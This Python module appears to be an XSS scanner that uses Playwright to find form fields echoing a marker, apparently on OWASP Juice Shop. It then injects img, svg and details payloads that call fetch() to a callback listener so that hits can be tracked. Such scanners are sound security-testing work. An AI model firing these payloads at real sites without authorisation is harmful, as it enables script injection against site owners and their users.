"""Simplified XSS scanner that injects payloads into discovered forms."""

from __future__ import annotations

from typing import Any, Dict, List, Optional, Set, Tuple

from playwright.sync_api import Browser, Locator, Page, TimeoutError as PlaywrightTimeoutError

from ...callback.server import register_payload, tracker

PAYLOAD_TEMPLATES = (
    "<img src=x onerror=fetch('{url}')>",
    "<svg onload=fetch('{url}')>",
    "<details open ontoggle=fetch('{url}')>",
)
MARKER = "__owasp_scanner_echo__"
ECHO_TIMEOUT_MS = 5000
INJECTION_SETTLE_MS = 700

OVERLAY_SELECTORS = (
    "button[aria-label='Close Welcome Banner']",
    ".cc-btn.cc-dismiss",
    "button[aria-label*='close']",
    ".cdk-overlay-backdrop",
    "mat-sidenav-container .mat-drawer-backdrop",
)

SEARCH_ICON_SELECTORS = (
    "mat-icon.mat-search_icon-search",
    ".mat-search_icons mat-icon:has-text('search')",
    "span.mat-search_icons mat-icon[class*='search']",
    "mat-icon:has-text('search'):not([class*='menu'])",
)


class XSSScanner:
    def __init__(self, page: Page, browser: Browser, listener_url: str, origin_url: str, playwright_instance: Any):
        self.page = page
        self.browser = browser
        self.listener_url = listener_url.rstrip("/")
        self.origin_url = origin_url
        self.playwright = playwright_instance
        self.successful_echo_fields: List[Tuple[str, str]] = []
        self._echo_seen: Set[Tuple[str, str]] = set()
        self.injected_payloads: List[Dict[str, str]] = []

    def _safe_click(self, locator: Locator, *, timeout: int = 1500) -> bool:
        try:
            locator.click(timeout=timeout)
            return True
        except PlaywrightTimeoutError:
            return False
        except Exception:
            return False

    def _close_overlays(self) -> None:
        for selector in OVERLAY_SELECTORS:
            element = self.page.locator(selector).first
            if element.count() == 0:
                continue
            self._safe_click(element)

        try:
            self.page.keyboard.press("Escape")
        except Exception:
            pass

    def _activate_search_bar(self) -> None:
        search_input = self.page.locator("#mat-input-1")
        if search_input.count() > 0 and search_input.is_editable():
            return

        for selector in SEARCH_ICON_SELECTORS:
            icon = self.page.locator(selector).first
            if icon.count() == 0:
                continue
            if not self._safe_click(icon):
                continue
            try:
                search_input.wait_for(state="visible", timeout=2000)
            except Exception:
                continue
            if search_input.is_editable():
                return

    def _prepare_page(self, url: str) -> None:
        self.page.goto(url, timeout=8000, wait_until="domcontentloaded")
        self._close_overlays()
        self._activate_search_bar()

    def _focus_field(self, locator) -> None:
        try:
            locator.wait_for(state="visible", timeout=2000)
        except Exception:
            pass
        try:
            locator.focus()
            return
        except Exception:
            pass
        self._safe_click(locator)

    def _enter_text(self, locator: Locator, text: str, *, typing_delay: float = 0.03) -> None:
        try:
            locator.fill("")
        except Exception:
            pass

        try:
            if typing_delay and typing_delay > 0:
                locator.type(text, delay=typing_delay)
            else:
                locator.type(text)
        except Exception:
            locator.fill(text)

        self._dispatch_input_events(locator)

    def _attempt_submit(self, locator: Locator) -> None:
        try:
            locator.press("Enter")
            return
        except Exception:
            pass

        try:
            self.page.keyboard.press("Enter")
            return
        except Exception:
            pass

        self._submit_via_form(locator)

    def _dispatch_input_events(self, locator) -> None:
        try:
            locator.evaluate(
                "el => { el.dispatchEvent(new Event('input', { bubbles: true }));"
                " el.dispatchEvent(new Event('change', { bubbles: true })); }"
            )
        except Exception:
            pass

    def _submit_via_form(self, locator) -> None:
        try:
            locator.evaluate(
                "el => { if (el.form) { el.form.requestSubmit ? el.form.requestSubmit() : el.form.submit(); } }"
            )
        except Exception:
            pass

    def _build_selector(self, field_identifier: str) -> str:
        attr = "name"
        value = field_identifier

        if "::" in field_identifier:
            prefix, value = field_identifier.split("::", 1)
            attr = {
                "id": "id",
                "aria": "aria-label",
                "placeholder": "placeholder",
                "data-testid": "data-testid",
            }.get(prefix, "name")

        escaped_value = value.replace("\\", "\\\\").replace('"', '\\"')
        return f"[{attr}=\"{escaped_value}\"]"

    def _get_field_locator(self, field_identifier: str):
        selector = self._build_selector(field_identifier)
        locator = self.page.locator(selector)

        if locator.count() == 0 and "::" in field_identifier:
            _, value = field_identifier.split("::", 1)
            fallback_selector = f"[name=\"{value.replace('\\', '\\\\').replace('"', '\\"')}\"]"
            fallback_locator = self.page.locator(fallback_selector)
            if fallback_locator.count() > 0:
                return fallback_locator

        return locator

    def _apply_payload(self, field_identifier: str, payload_id: str, template_index: int) -> Dict[str, str]:
        payload = PAYLOAD_TEMPLATES[template_index].format(url=f"{self.listener_url}?id={payload_id}")
        locator = self._get_field_locator(field_identifier)
        if locator.count() == 0:
            return {}

        input_field = locator.first
        self._focus_field(input_field)
        self._enter_text(input_field, payload)
        try:
            with self.page.expect_navigation(wait_until="domcontentloaded", timeout=ECHO_TIMEOUT_MS):
                self._attempt_submit(input_field)
        except PlaywrightTimeoutError:
            self._attempt_submit(input_field)

        try:
            self.page.wait_for_load_state("networkidle", timeout=1500)
        except PlaywrightTimeoutError:
            pass
        self.page.wait_for_timeout(250)

        if payload_id in tracker.injected:
            tracker.injected[payload_id].payload = payload

        return {
            "field": field_identifier,
            "payload_id": payload_id,
            "payload": payload,
        }

    def _echo_test(self, url: str, field_identifier: str) -> Optional[str]:
        self._prepare_page(url)
        locator = self._get_field_locator(field_identifier)
        if locator.count() == 0:
            return None
        input_field = locator.first
        self._focus_field(input_field)
        self._enter_text(input_field, MARKER)
        navigation_url: Optional[str] = None
        try:
            with self.page.expect_navigation(wait_until="domcontentloaded", timeout=ECHO_TIMEOUT_MS) as navigation:
                self._attempt_submit(input_field)
            navigation_url = navigation.value.url if navigation.value else None
        except PlaywrightTimeoutError:
            self._attempt_submit(input_field)
        except Exception:
            pass

        try:
            self.page.wait_for_load_state("networkidle", timeout=1500)
        except PlaywrightTimeoutError:
            pass
        self.page.wait_for_timeout(300)
        final_url = navigation_url or self.page.url
        try:
            self.page.wait_for_function(
                "marker => document.body && document.body.innerText.includes(marker)",
                MARKER,
                timeout=ECHO_TIMEOUT_MS,
            )
            return final_url
        except PlaywrightTimeoutError:
            pass

        # fallback: check full DOM HTML
        try:
            if self.page.evaluate("marker => document.documentElement.outerHTML.includes(marker)", MARKER):
                return final_url
        except Exception:
            pass

        # fallback: check input value on the current page
        try:
            refreshed_locator = self._get_field_locator(field_identifier)
            if refreshed_locator.count() > 0:
                current_value = refreshed_locator.first.input_value()
                if current_value and MARKER in current_value:
                    return final_url
        except Exception:
            pass

        # fallback: check URL (for cases where payload is reflected in query params)
        if MARKER in self.page.url:
            return final_url

        # fallback: if navigation occurred, allow a final scan of body text once more
        if final_url != url:
            try:
                self.page.wait_for_timeout(700)
                page_text = self.page.locator("body").inner_text()
                if MARKER in page_text:
                    return final_url
            except Exception:
                pass

        return None

    def run(self, form_targets: List[Dict[str, Any]]) -> List[Dict[str, str]]:
        for form in form_targets:
            url = form.get("url_de_envio")
            campos: List[str] = form.get("campos", [])
            if not url or not campos:
                continue
            for field_identifier in campos:
                if not field_identifier:
                    continue
                try:
                    echoed_url = self._echo_test(url, field_identifier)
                    if echoed_url:
                        key = (echoed_url, field_identifier)
                        if key not in self._echo_seen:
                            self._echo_seen.add(key)
                            self.successful_echo_fields.append(key)
                except Exception:
                    continue

        if not self.successful_echo_fields:
            return []

        for url, field_identifier in self.successful_echo_fields:
            self._prepare_page(url)
            for index, _ in enumerate(PAYLOAD_TEMPLATES):
                payload_id = register_payload(None, field_identifier, "", url)
                try:
                    record = self._apply_payload(field_identifier, payload_id, index)
                    if record:
                        self.injected_payloads.append(record)
                    self.page.wait_for_timeout(INJECTION_SETTLE_MS)
                except Exception:
                    continue

        return self.injected_payloads
